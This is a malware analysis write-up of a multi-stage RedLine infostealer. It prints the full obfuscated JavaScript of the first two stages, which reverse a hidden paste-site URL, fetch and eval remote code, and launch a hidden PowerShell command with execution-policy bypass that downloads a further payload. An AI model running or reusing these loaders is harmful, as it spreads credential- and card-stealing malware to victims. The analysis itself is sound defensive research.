## Multi Stage Redline Infostealer

RedLine Stealer is malware available on underground forums for sale. This malware harvests information from browsers such as saved credentials, autocomplete data, and credit card information. A system inventory is also taken when running on a target machine, to include details such as the username, location data, hardware configuration, and information regarding installed security software.

## Initial JavaScript

``` powershell
function TwtgaWCivnsxiQCbwJSLTCoEJMdptJClJHpZjAWDdZiSqltCvhdULoxXBHwyHFsZGOAumfobRmSZYGcnTOqlQIORHhyqfcitfVIVoRXnknNbOnVerxNCyeaBAnMEDuvyWPYATkqBNDZeMFnDOCskmTaUSfpbVTXPKKBNtUyFSBdQbdByWNvZaxWgdUegnKYPirtLGYpA(str) {
    return str.split('').reverse().join('');
}

var oPFGPIuwcHruJTqFXjackEDlcnSzkthlCzIxXlRxaOutOoYGbxOJUKfcrtBMDtjLncxhrEnaotOSkdlvRkrSPphrTeSAxkMlnajBFllHaaMPVqXpMfUyXfABgdmnGxUicFvvXnegWxKqCEcNpydCZTlzoPAHStszEyriqeEaCkwZHyLRCPbAclBysrLOoipeWFgBnPbj = "56wui/d/ee.etsap//:sptth";
var cumuxNDEeacpyaraANJjLJnjKWjsdTrCJBWmgiGbHiuUIbVrZIQDORghDNrMPsyUzaOqvclFsaAspOPMMsRRVxjwjEHSFNjjlaJyfnBefRcZGdPVEHzEDwYZHiYlWgtzZIrqwJncSyvGXRdtQmwOgNmnXYtFaUYsLwaEJLZVsBorPpnRuJbiAmWofsqthdWXRodWaxKM = TwtgaWCivnsxiQCbwJSLTCoEJMdptJClJHpZjAWDdZiSqltCvhdULoxXBHwyHFsZGOAumfobRmSZYGcnTOqlQIORHhyqfcitfVIVoRXnknNbOnVerxNCyeaBAnMEDuvyWPYATkqBNDZeMFnDOCskmTaUSfpbVTXPKKBNtUyFSBdQbdByWNvZaxWgdUegnKYPirtLGYpA(oPFGPIuwcHruJTqFXjackEDlcnSzkthlCzIxXlRxaOutOoYGbxOJUKfcrtBMDtjLncxhrEnaotOSkdlvRkrSPphrTeSAxkMlnajBFllHaaMPVqXpMfUyXfABgdmnGxUicFvvXnegWxKqCEcNpydCZTlzoPAHStszEyriqeEaCkwZHyLRCPbAclBysrLOoipeWFgBnPbj);

var BrBaUNfshzTYuatBKvgqoIJUECNQrrYReHtKDTCqurBnbAdZSxzIZjRObRMPzLaicRZnQkFIqMMyCWveHIPWPJxKyxjNKHwrjCuFIKPnxUVUwYWLnpcclMXOSUbAmZbpTuJvXsXbpqKsMeoWvLKApYUccAfUXpsuZOdgNwpgnWLKnJxDqgbsBzGoNgAzsbjeRIGvoejL = new ActiveXObject("MSXML2.ServerXMLHTTP");
BrBaUNfshzTYuatBKvgqoIJUECNQrrYReHtKDTCqurBnbAdZSxzIZjRObRMPzLaicRZnQkFIqMMyCWveHIPWPJxKyxjNKHwrjCuFIKPnxUVUwYWLnpcclMXOSUbAmZbpTuJvXsXbpqKsMeoWvLKApYUccAfUXpsuZOdgNwpgnWLKnJxDqgbsBzGoNgAzsbjeRIGvoejL.open("GET", cumuxNDEeacpyaraANJjLJnjKWjsdTrCJBWmgiGbHiuUIbVrZIQDORghDNrMPsyUzaOqvclFsaAspOPMMsRRVxjwjEHSFNjjlaJyfnBefRcZGdPVEHzEDwYZHiYlWgtzZIrqwJncSyvGXRdtQmwOgNmnXYtFaUYsLwaEJLZVsBorPpnRuJbiAmWofsqthdWXRodWaxKM, false);
BrBaUNfshzTYuatBKvgqoIJUECNQrrYReHtKDTCqurBnbAdZSxzIZjRObRMPzLaicRZnQkFIqMMyCWveHIPWPJxKyxjNKHwrjCuFIKPnxUVUwYWLnpcclMXOSUbAmZbpTuJvXsXbpqKsMeoWvLKApYUccAfUXpsuZOdgNwpgnWLKnJxDqgbsBzGoNgAzsbjeRIGvoejL.send();

var zFRcqeVmscmYglMSIKZAFqrssqIFeUgbGdouShnFfqpDAimEMJkAyPxIcPDUpQQAMmYIVtUFfORiLjLCeEUXtOPBVuPvoWYsuhhZOrGMMOgfinDwtmaWyqxlWykOsjqbWlPcJphRbNOKfyAANzexSiOpBsamnhxbXEknDRwbAgKIcMSduPSyCmavuzOxxPFKJyiqQhxu = BrBaUNfshzTYuatBKvgqoIJUECNQrrYReHtKDTCqurBnbAdZSxzIZjRObRMPzLaicRZnQkFIqMMyCWveHIPWPJxKyxjNKHwrjCuFIKPnxUVUwYWLnpcclMXOSUbAmZbpTuJvXsXbpqKsMeoWvLKApYUccAfUXpsuZOdgNwpgnWLKnJxDqgbsBzGoNgAzsbjeRIGvoejL.responseText;

(function() {
    eval(zFRcqeVmscmYglMSIKZAFqrssqIFeUgbGdouShnFfqpDAimEMJkAyPxIcPDUpQQAMmYIVtUFfORiLjLCeEUXtOPBVuPvoWYsuhhZOrGMMOgfinDwtmaWyqxlWykOsjqbWlPcJphRbNOKfyAANzexSiOpBsamnhxbXEknDRwbAgKIcMSduPSyCmavuzOxxPFKJyiqQhxu);
})();
```

Besides the very long annoying variable names, this initial script is quite simple, it takes the string "56wui/d/ee.etsap//:sptth", reverses it, and executes the contents of that URL.

Now we know where the second stage is hosted, we'll head over and download the contents to investigate further.

## 2nd Stage - Further JavaScript

``` powershell
    var gQBnV = false;

    function PPGnIJfdSdJwnbhDmJOmPsHixFAUqYszDllXfNfgjBvoLlUjSGGClBwLWEMMGNpFQYhoJOugHPuOyfuGziEuOWLmcMWmyWNfYqfdoCgGMvwCJltPxiflBrKgywudmPLWXTYXcoJboaQdSKXTzmBswwBNcVdmARyaXbfmbDtfxzfTCFeQWgAnOQtnHPWVxrQnvVspDhKI(LpxIb) {
        return LpxIb.split('').reverse().join('');
    }
   
    var olffySApjnmNzEVCrHdsmIvkvtrmdvjBfknvClSyBGJHuqChGtDdwNjUtRxkkyfJOYUiJGZMAThKDTsUxGJuaNqSbTPvTbbqmefDGsXrinQyOMnXQfeSjWxgZKFIubTWXJNqCxTJwTRbGDBclyLnPEmbnFRmJCPDQxEhyrMtITkhfcVQBxcMaJXujuQBrVucxLrEASLY = PPGnIJfdSdJwnbhDmJOmPsHixFAUqYszDllXfNfgjBvoLlUjSGGClBwLWEMMGNpFQYhoJOugHPuOyfuGziEuOWLmcMWmyWNfYqfdoCgGMvwCJltPxiflBrKgywudmPLWXTYXcoJboaQdSKXTzmBswwBNcVdmARyaXbfmbDtfxzfTCFeQWgAnOQtnHPWVxrQnvVspDhKI("♚♛kC♚♛p♚♛wJ♚♛UG♚♛tBQY♚♛4E♚♛rBgb♚♛wE♚♛n♚♛♚♛I♚♛wC♚♛n♚♛♚♛X♚♛EG♚♛0BQY♚♛QE♚♛tBQY♚♛IH♚♛nBwb♚♛IH♚♛QB♚♛X♚♛oD♚♛DBwJ♚♛♚♛C♚♛s♚♛♚♛I♚♛cC♚♛x♚♛wJ♚♛♚♛C♚♛s♚♛♚♛I♚♛cC♚♛lBQb♚♛EG♚♛OBwc♚♛IG♚♛WBwJ♚♛♚♛C♚♛s♚♛♚♛I♚♛cC♚♛y♚♛wJ♚♛♚♛C♚♛s♚♛♚♛I♚♛cC♚♛n♚♛♚♛I♚♛wC♚♛g♚♛wJ♚♛gG♚♛0B♚♛d♚♛♚♛H♚♛zBgO♚♛8C♚♛v♚♛♚♛c♚♛EG♚♛zB♚♛d♚♛UG♚♛u♚♛QZ♚♛UG♚♛v♚♛♚♛Z♚♛8C♚♛VBQN♚♛cD♚♛LBQa♚♛8C♚♛w♚♛wJ♚♛gC♚♛g♚♛QX♚♛0F♚♛bB♚♛d♚♛MG♚♛lBga♚♛IG♚♛vBwW♚♛♚♛C♚♛s♚♛♚♛b♚♛wG♚♛1Bgb♚♛QC♚♛o♚♛QZ♚♛sG♚♛vBgd♚♛4G♚♛JBgL♚♛kC♚♛n♚♛gb♚♛UH♚♛SBwJ♚♛gC♚♛kBwb♚♛gG♚♛0BQZ♚♛0E♚♛0BQZ♚♛cE♚♛u♚♛QZ♚♛♚♛H♚♛5B♚♛d♚♛QC♚♛g♚♛QP♚♛♚♛C♚♛kBwb♚♛gG♚♛0BQZ♚♛0G♚♛k♚♛wO♚♛kC♚♛n♚♛QM♚♛MH♚♛zBQY♚♛wG♚♛DBgL♚♛MD♚♛5Bgc♚♛EG♚♛yBgY♚♛kG♚♛MBwc♚♛MH♚♛hB♚♛b♚♛ME♚♛n♚♛♚♛K♚♛UG♚♛wBQe♚♛QF♚♛0BQZ♚♛cE♚♛u♚♛Qe♚♛wG♚♛iBQb♚♛UG♚♛zBwc♚♛EE♚♛kBQZ♚♛QG♚♛hBwb♚♛wG♚♛k♚♛♚♛I♚♛0D♚♛g♚♛QZ♚♛♚♛H♚♛5B♚♛d♚♛QC♚♛7♚♛QK♚♛MH♚♛lB♚♛d♚♛kH♚♛CB♚♛Z♚♛4G♚♛hBQb♚♛0G♚♛vBwY♚♛QC♚♛o♚♛♚♛Z♚♛EG♚♛vB♚♛T♚♛oD♚♛6♚♛QX♚♛kH♚♛sBgY♚♛0G♚♛lBwc♚♛MH♚♛BBgL♚♛4G♚♛vBQa♚♛QH♚♛jBQZ♚♛wG♚♛mBQZ♚♛IF♚♛u♚♛Qb♚♛UG♚♛0Bwc♚♛kH♚♛TBwW♚♛♚♛C♚♛9♚♛♚♛I♚♛kH♚♛sBgY♚♛0G♚♛lBwc♚♛MH♚♛BB♚♛Z♚♛UG♚♛kBQY♚♛8G♚♛sB♚♛J♚♛sD♚♛p♚♛♚♛Z♚♛4G♚♛hBQb♚♛0G♚♛vBwQ♚♛QD♚♛2♚♛QZ♚♛MH♚♛hBgY♚♛QC♚♛o♚♛wZ♚♛4G♚♛pBgc♚♛QH♚♛TB♚♛N♚♛YD♚♛lBwc♚♛EG♚♛CBQb♚♛8G♚♛yBgR♚♛oD♚♛6♚♛QX♚♛QH♚♛yBQZ♚♛YH♚♛uBwb♚♛ME♚♛u♚♛Qb♚♛UG♚♛0Bwc♚♛kH♚♛TBwW♚♛♚♛C♚♛9♚♛♚♛I♚♛MH♚♛lB♚♛d♚♛kH♚♛CB♚♛Z♚♛4G♚♛hBQb♚♛0G♚♛vBwY♚♛QC♚♛7♚♛QK♚♛gG♚♛0BwZ♚♛4G♚♛lB♚♛T♚♛QD♚♛2♚♛QZ♚♛MH♚♛hBgY♚♛QC♚♛g♚♛♚♛L♚♛gH♚♛lB♚♛Z♚♛4G♚♛JB♚♛d♚♛IH♚♛hB♚♛d♚♛MH♚♛k♚♛♚♛K♚♛cG♚♛uBQa♚♛IH♚♛0Bwc♚♛IG♚♛1BwU♚♛4C♚♛0B♚♛e♚♛UG♚♛UBQZ♚♛cG♚♛hBQb♚♛kG♚♛k♚♛♚♛I♚♛0D♚♛g♚♛♚♛Z♚♛4G♚♛hBQb♚♛0G♚♛vBwQ♚♛QD♚♛2♚♛QZ♚♛MH♚♛hBgY♚♛QC♚♛7♚♛♚♛e♚♛UG♚♛kBgb♚♛kE♚♛0Bgc♚♛EG♚♛0Bwc♚♛QC♚♛g♚♛QL♚♛♚♛C♚♛4BQZ♚♛QG♚♛uBQS♚♛QG♚♛uBQZ♚♛QC♚♛g♚♛QP♚♛♚♛C♚♛oB♚♛d♚♛cG♚♛uBQZ♚♛wE♚♛0♚♛gN♚♛UG♚♛zBQY♚♛IG♚♛k♚♛wO♚♛gG♚♛0BwZ♚♛4G♚♛lB♚♛T♚♛4C♚♛nBQY♚♛wG♚♛GB♚♛d♚♛IH♚♛hB♚♛d♚♛MH♚♛k♚♛♚♛I♚♛0D♚♛r♚♛♚♛I♚♛gH♚♛lB♚♛Z♚♛4G♚♛JB♚♛d♚♛IH♚♛hB♚♛d♚♛MH♚♛k♚♛wO♚♛gH♚♛lB♚♛Z♚♛4G♚♛JB♚♛d♚♛IH♚♛hB♚♛d♚♛MH♚♛k♚♛♚♛I♚♛QH♚♛nBQL♚♛♚♛C♚♛4BQZ♚♛QG♚♛uBQS♚♛QG♚♛uBQZ♚♛QC♚♛g♚♛♚♛Z♚♛4G♚♛hBQL♚♛♚♛C♚♛w♚♛♚♛I♚♛UG♚♛nBQL♚♛♚♛C♚♛4BQZ♚♛QG♚♛uBQS♚♛QH♚♛yBQY♚♛QH♚♛zB♚♛J♚♛sD♚♛p♚♛wZ♚♛EG♚♛sBgR♚♛QG♚♛uBQZ♚♛QC♚♛o♚♛gZ♚♛8E♚♛4BQZ♚♛QG♚♛uBQS♚♛4C♚♛0B♚♛e♚♛UG♚♛UBQZ♚♛cG♚♛hBQb♚♛kG♚♛k♚♛♚♛I♚♛0D♚♛g♚♛♚♛e♚♛UG♚♛kBgb♚♛kE♚♛kBgb♚♛UG♚♛k♚♛wO♚♛kC♚♛nBQY♚♛wG♚♛GB♚♛d♚♛IH♚♛hB♚♛d♚♛MH♚♛k♚♛♚♛K♚♛YG♚♛PB♚♛e♚♛UG♚♛kBgb♚♛kE♚♛u♚♛♚♛d♚♛gH♚♛lB♚♛V♚♛UG♚♛nBQY♚♛0G♚♛pB♚♛J♚♛♚♛C♚♛9♚♛♚♛I♚♛gH♚♛lB♚♛Z♚♛4G♚♛JB♚♛d♚♛IH♚♛hB♚♛d♚♛MH♚♛k♚♛wO♚♛cC♚♛+♚♛gP♚♛QE♚♛OBQR♚♛8F♚♛0♚♛gN♚♛UE♚♛TBQQ♚♛IE♚♛8♚♛♚♛P♚♛cC♚♛g♚♛QP♚♛♚♛C♚♛nBQY♚♛wG♚♛GB♚♛Z♚♛4G♚♛lB♚♛J♚♛sD♚♛n♚♛gP♚♛4D♚♛UBgU♚♛EE♚♛UBwU♚♛8F♚♛0♚♛gN♚♛UE♚♛TBQQ♚♛IE♚♛8♚♛♚♛P♚♛cC♚♛g♚♛QP♚♛♚♛C♚♛nBQY♚♛wG♚♛GB♚♛d♚♛IH♚♛hB♚♛d♚♛MH♚♛k♚♛wO♚♛kC♚♛zBQZ♚♛QH♚♛5BgQ♚♛UG♚♛nBQY♚♛0G♚♛pB♚♛J♚♛gC♚♛nBgb♚♛kG♚♛yB♚♛d♚♛MF♚♛0BQZ♚♛cE♚♛u♚♛♚♛O♚♛YE♚♛UBQV♚♛oD♚♛6♚♛QX♚♛cG♚♛uBQa♚♛QG♚♛vBwY♚♛4G♚♛FBgL♚♛QH♚♛4BQZ♚♛QF♚♛u♚♛Qb♚♛UG♚♛0Bwc♚♛kH♚♛TBwW♚♛♚♛C♚♛9♚♛♚♛I♚♛QH♚♛4BQZ♚♛QF♚♛lBwZ♚♛EG♚♛tBQa♚♛QC♚♛7♚♛QK♚♛wG♚♛yBQV♚♛UG♚♛nBQY♚♛0G♚♛pB♚♛J♚♛gC♚♛hB♚♛d♚♛EG♚♛EB♚♛Z♚♛EG♚♛vB♚♛b♚♛4G♚♛3Bwb♚♛QE♚♛u♚♛♚♛d♚♛4G♚♛lBQa♚♛wG♚♛DBgY♚♛UG♚♛3B♚♛J♚♛♚♛C♚♛9♚♛♚♛I♚♛MH♚♛lB♚♛d♚♛kH♚♛CBQZ♚♛cG♚♛hBQb♚♛kG♚♛k♚♛wO♚♛QH♚♛uBQZ♚♛kG♚♛sBwQ♚♛IG♚♛lBwV♚♛4C♚♛0BQZ♚♛4E♚♛u♚♛Qb♚♛UG♚♛0Bwc♚♛kH♚♛TB♚♛I♚♛QH♚♛jBQZ♚♛oG♚♛iBwT♚♛0C♚♛3BQZ♚♛4E♚♛g♚♛QP♚♛♚♛C♚♛0Bgb♚♛UG♚♛pB♚♛b♚♛ME♚♛iBQZ♚♛cH♚♛k♚♛wO♚♛cC♚♛5♚♛♚♛M♚♛YD♚♛x♚♛QO♚♛UD♚♛y♚♛♚♛M♚♛cD♚♛x♚♛wP♚♛cG♚♛wBga♚♛4C♚♛zBga♚♛8C♚♛sBQY♚♛4G♚♛pBwZ♚♛kG♚♛yBwb♚♛8C♚♛3♚♛QN♚♛ID♚♛v♚♛QM♚♛kD♚♛2♚♛wL♚♛QD♚♛w♚♛♚♛M♚♛8C♚♛zBQZ♚♛cG♚♛hBQb♚♛kG♚♛v♚♛gc♚♛IG♚♛u♚♛Qb♚♛8G♚♛jBgL♚♛MH♚♛uBQZ♚♛cG♚♛hBQb♚♛kG♚♛lB♚♛Z♚♛QG♚♛hBwb♚♛wG♚♛wBQd♚♛8C♚♛v♚♛gO♚♛MH♚♛wB♚♛d♚♛QH♚♛oBwJ♚♛♚♛C♚♛9♚♛♚♛I♚♛wG♚♛yBQV♚♛UG♚♛nBQY♚♛0G♚♛pB♚♛J");
    var hanqbbYcWLzDlNxOPncjvQCBQonxVECthpIBwsmoBBvosDsujcOzxzaSUiwwkpZHunsTFbSwqYqacScohDNICrUwvjkGulSfZZmeTtftPaPdvKsQTJQISdssGpxQIUGuxwhWPmoCMGohuYLXDyTwcGOtBtKBHZMXyOJlkQOEhkiqLvzhicJrDPknYXzFTodoezdLgRHq = PPGnIJfdSdJwnbhDmJOmPsHixFAUqYszDllXfNfgjBvoLlUjSGGClBwLWEMMGNpFQYhoJOugHPuOyfuGziEuOWLmcMWmyWNfYqfdoCgGMvwCJltPxiflBrKgywudmPLWXTYXcoJboaQdSKXTzmBswwBNcVdmARyaXbfmbDtfxzfTCFeQWgAnOQtnHPWVxrQnvVspDhKI("' = ogidoC$") + 
    olffySApjnmNzEVCrHdsmIvkvtrmdvjBfknvClSyBGJHuqChGtDdwNjUtRxkkyfJOYUiJGZMAThKDTsUxGJuaNqSbTPvTbbqmefDGsXrinQyOMnXQfeSjWxgZKFIubTWXJNqCxTJwTRbGDBclyLnPEmbnFRmJCPDQxEhyrMtITkhfcVQBxcMaJXujuQBrVucxLrEASLY + "';" +
    PPGnIJfdSdJwnbhDmJOmPsHixFAUqYszDllXfNfgjBvoLlUjSGGClBwLWEMMGNpFQYhoJOugHPuOyfuGziEuOWLmcMWmyWNfYqfdoCgGMvwCJltPxiflBrKgywudmPLWXTYXcoJboaQdSKXTzmBswwBNcVdmARyaXbfmbDtfxzfTCFeQWgAnOQtnHPWVxrQnvVspDhKI("S[ = dxujWO$") + 
    PPGnIJfdSdJwnbhDmJOmPsHixFAUqYszDllXfNfgjBvoLlUjSGGClBwLWEMMGNpFQYhoJOugHPuOyfuGziEuOWLmcMWmyWNfYqfdoCgGMvwCJltPxiflBrKgywudmPLWXTYXcoJboaQdSKXTzmBswwBNcVdmARyaXbfmbDtfxzfTCFeQWgAnOQtnHPWVxrQnvVspDhKI("eT.metsy") + 
    PPGnIJfdSdJwnbhDmJOmPsHixFAUqYszDllXfNfgjBvoLlUjSGGClBwLWEMMGNpFQYhoJOugHPuOyfuGziEuOWLmcMWmyWNfYqfdoCgGMvwCJltPxiflBrKgywudmPLWXTYXcoJboaQdSKXTzmBswwBNcVdmARyaXbfmbDtfxzfTCFeQWgAnOQtnHPWVxrQnvVspDhKI("nU::]gnidocnE.tx") + 
    PPGnIJfdSdJwnbhDmJOmPsHixFAUqYszDllXfNfgjBvoLlUjSGGClBwLWEMMGNpFQYhoJOugHPuOyfuGziEuOWLmcMWmyWNfYqfdoCgGMvwCJltPxiflBrKgywudmPLWXTYXcoJboaQdSKXTzmBswwBNcVdmARyaXbfmbDtfxzfTCFeQWgAnOQtnHPWVxrQnvVspDhKI("eG.edoci") + 
    PPGnIJfdSdJwnbhDmJOmPsHixFAUqYszDllXfNfgjBvoLlUjSGGClBwLWEMMGNpFQYhoJOugHPuOyfuGziEuOWLmcMWmyWNfYqfdoCgGMvwCJltPxiflBrKgywudmPLWXTYXcoJboaQdSKXTzmBswwBNcVdmARyaXbfmbDtfxzfTCFeQWgAnOQtnHPWVxrQnvVspDhKI("C.metsyS[(gnirtSt") + 
    PPGnIJfdSdJwnbhDmJOmPsHixFAUqYszDllXfNfgjBvoLlUjSGGClBwLWEMMGNpFQYhoJOugHPuOyfuGziEuOWLmcMWmyWNfYqfdoCgGMvwCJltPxiflBrKgywudmPLWXTYXcoJboaQdSKXTzmBswwBNcVdmARyaXbfmbDtfxzfTCFeQWgAnOQtnHPWVxrQnvVspDhKI("6esaBmorF::]trevno") + 
    PPGnIJfdSdJwnbhDmJOmPsHixFAUqYszDllXfNfgjBvoLlUjSGGClBwLWEMMGNpFQYhoJOugHPuOyfuGziEuOWLmcMWmyWNfYqfdoCgGMvwCJltPxiflBrKgywudmPLWXTYXcoJboaQdSKXTzmBswwBNcVdmARyaXbfmbDtfxzfTCFeQWgAnOQtnHPWVxrQnvVspDhKI("lper.ogidoc$(gnirtS4") + 
    PPGnIJfdSdJwnbhDmJOmPsHixFAUqYszDllXfNfgjBvoLlUjSGGClBwLWEMMGNpFQYhoJOugHPuOyfuGziEuOWLmcMWmyWNfYqfdoCgGMvwCJltPxiflBrKgywudmPLWXTYXcoJboaQdSKXTzmBswwBNcVdmARyaXbfmbDtfxzfTCFeQWgAnOQtnHPWVxrQnvVspDhKI(";)) )'A','♚♛'(eca") +
    PPGnIJfdSdJwnbhDmJOmPsHixFAUqYszDllXfNfgjBvoLlUjSGGClBwLWEMMGNpFQYhoJOugHPuOyfuGziEuOWLmcMWmyWNfYqfdoCgGMvwCJltPxiflBrKgywudmPLWXTYXcoJboaQdSKXTzmBswwBNcVdmARyaXbfmbDtfxzfTCFeQWgAnOQtnHPWVxrQnvVspDhKI("niw- exe.llehsrewop") + 
    PPGnIJfdSdJwnbhDmJOmPsHixFAUqYszDllXfNfgjBvoLlUjSGGClBwLWEMMGNpFQYhoJOugHPuOyfuGziEuOWLmcMWmyWNfYqfdoCgGMvwCJltPxiflBrKgywudmPLWXTYXcoJboaQdSKXTzmBswwBNcVdmARyaXbfmbDtfxzfTCFeQWgAnOQtnHPWVxrQnvVspDhKI("exe- neddih elytswod") + 
    PPGnIJfdSdJwnbhDmJOmPsHixFAUqYszDllXfNfgjBvoLlUjSGGClBwLWEMMGNpFQYhoJOugHPuOyfuGziEuOWLmcMWmyWNfYqfdoCgGMvwCJltPxiflBrKgywudmPLWXTYXcoJboaQdSKXTzmBswwBNcVdmARyaXbfmbDtfxzfTCFeQWgAnOQtnHPWVxrQnvVspDhKI("N- ssapyb ycilopnoituc") + 
    PPGnIJfdSdJwnbhDmJOmPsHixFAUqYszDllXfNfgjBvoLlUjSGGClBwLWEMMGNpFQYhoJOugHPuOyfuGziEuOWLmcMWmyWNfYqfdoCgGMvwCJltPxiflBrKgywudmPLWXTYXcoJboaQdSKXTzmBswwBNcVdmARyaXbfmbDtfxzfTCFeQWgAnOQtnHPWVxrQnvVspDhKI("moc- eliforPo") + 
    PPGnIJfdSdJwnbhDmJOmPsHixFAUqYszDllXfNfgjBvoLlUjSGGClBwLWEMMGNpFQYhoJOugHPuOyfuGziEuOWLmcMWmyWNfYqfdoCgGMvwCJltPxiflBrKgywudmPLWXTYXcoJboaQdSKXTzmBswwBNcVdmARyaXbfmbDtfxzfTCFeQWgAnOQtnHPWVxrQnvVspDhKI("dxujWO$ dnam");
    var eDiSkbNqurqMJDuUiMjNdhOPQQQBvgCftSEHiubYOGUaguzUTNMYeXrTtQOfKyfoAYstCerExYstbTlKouLwhYrnRQphSSARgdjkjrVfvyUZpnHZUSKwsqxMwNFXqElpakdDRQTBboYYHlOHdpQuaUtcDulXphSoyytwUdssTCfGwUoaWBxOUbiVhnwlqCxQURynpcjj = "\x57\x53\x63\x72\x69\x70\x74\x2E\x53\x68\x65\x6C\x6C"
    var ESlFnRWpugflXfvZqSyJlkwsMpcbzCAvFjVaLHGmHCPVjVevdKGGqImgXdntYCyHpCJZWNwKzrUiJEdtUbSUwZDEcrUscveYRSCVwMyIGRzKcZGjcknRtkmrhtoHYyjrUqVpSuBjUVbcmXfLCWiAdbpEMwWATsqxmdxuDKODAfEFiwTDSExHzcsrUPrmOKWPyRGNlldF = new ActiveXObject(eDiSkbNqurqMJDuUiMjNdhOPQQQBvgCftSEHiubYOGUaguzUTNMYeXrTtQOfKyfoAYstCerExYstbTlKouLwhYrnRQphSSARgdjkjrVfvyUZpnHZUSKwsqxMwNFXqElpakdDRQTBboYYHlOHdpQuaUtcDulXphSoyytwUdssTCfGwUoaWBxOUbiVhnwlqCxQURynpcjj);
    ESlFnRWpugflXfvZqSyJlkwsMpcbzCAvFjVaLHGmHCPVjVevdKGGqImgXdntYCyHpCJZWNwKzrUiJEdtUbSUwZDEcrUscveYRSCVwMyIGRzKcZGjcknRtkmrhtoHYyjrUqVpSuBjUVbcmXfLCWiAdbpEMwWATsqxmdxuDKODAfEFiwTDSExHzcsrUPrmOKWPyRGNlldF.Run("\x70\x6F\x77\x65\x72\x73\x68\x65\x6C\x6C\x20\x2D\x63\x6F\x6D\x6D\x61\x6E\x64 \"" + hanqbbYcWLzDlNxOPncjvQCBQonxVECthpIBwsmoBBvosDsujcOzxzaSUiwwkpZHunsTFbSwqYqacScohDNICrUwvjkGulSfZZmeTtftPaPdvKsQTJQISdssGpxQIUGuxwhWPmoCMGohuYLXDyTwcGOtBtKBHZMXyOJlkQOEhkiqLvzhicJrDPknYXzFTodoezdLgRHq + "\"", 0, false);
```

Again, annoyingly long variable names, we can rename these just to make it a little less of an eye sore.

We can then work out parts of the script, simply by reversing the strings for the PowerShell part, and doing a From Hex operation on the later parts.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/9838b0c5-600c-4c17-bab6-ef82d75c67a9)


